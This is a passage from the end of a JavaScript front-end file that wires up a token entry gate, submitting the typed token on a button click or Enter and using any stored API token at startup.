    }
  }
}

document.getElementById('gateSubmit').addEventListener('click', () => {
  const token = document.getElementById('gateToken').value.trim();
  if (token) void tryEnter(token);
});
document.getElementById('gateToken').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') document.getElementById('gateSubmit').click();
});

// ─────────────────────────────────────────────────────────────
//  启动
// ─────────────────────────────────────────────────────────────

if (api.token) {
  void tryEnter(api.token);
} else {
  showGate();
}
